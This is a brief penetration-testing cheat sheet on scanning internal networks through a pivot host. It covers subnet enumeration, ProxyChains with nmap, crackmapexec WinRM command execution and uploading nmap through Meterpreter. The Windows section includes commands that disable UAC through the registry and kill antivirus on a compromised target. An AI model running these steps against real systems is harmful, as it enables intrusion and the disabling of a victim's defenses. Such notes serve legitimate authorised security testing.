# Scanning though a pivot    
## Contents    
- [Scanning though a pivot](#scanning-though-a-pivot)
  * [Contents](#contents)
  * [Subnet Enumeration Commands](#subnet-enumeration-commands)
  * [ProxyChains](#proxychains)
  * [Uploading Static Binaries](#uploading-static-binaries)    
  
## Subnet Enumeration Commands    
Linux  
 
    ip a   
    arp -a
    cat /etc/hosts
    cat /etc/resolv.conf  
    netstat -antp    
    for x in {1..254};do (ping -c 1 10.1.1.$x | grep "bytes from" &); done | cut -d " "    
Windows     

    ipconfig   
## ProxyChains    
Use tools like ProxyChains to scan new hosts without dropping tools to disk.     
/etc/proxychains.conf #config file. Specify SOCKS4/5 proxy    
Nmap scan through a dynamic SOCKS proxy (only -sT will work):    

    proxychains nmap 10.10.10.10 -sT -p 80, 443     
Use WinRM through proxychains:    

    proxychains crackmapexec winrm 10.10.10.10 -u "USERNAME" -p "PASSWORD" -x "command"    
RDP through ProxyChains:     

    proxychains xfreerdp /u:DOMAIN\\username /p:password /v:ip      

## Uploading Static Binaries    
Use static binaries from [here](https://github.com/ernw/static-toolbox) or [here](https://github.com/andrew-d/static-binaries)     
Upload nmap binary to a Windows target (through meterpreter and scan)      

    meter > upload nmap_binary      
    meter > shell     
    #then disable UAC  
    C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f     
    meter > killall av       #turn off AV
    meter > shutdown /r    
    #wait a few minutes then renew the Meterpreter session    
    meter > nmap-setup.exe /S   #install nmap silently   
Upload nmap binary to a Linux target (through meterpreter and scan)      

    meter > upload nmap . 
    chmod +x run-nmap.sh   
    ./run-nmap.sh   
    
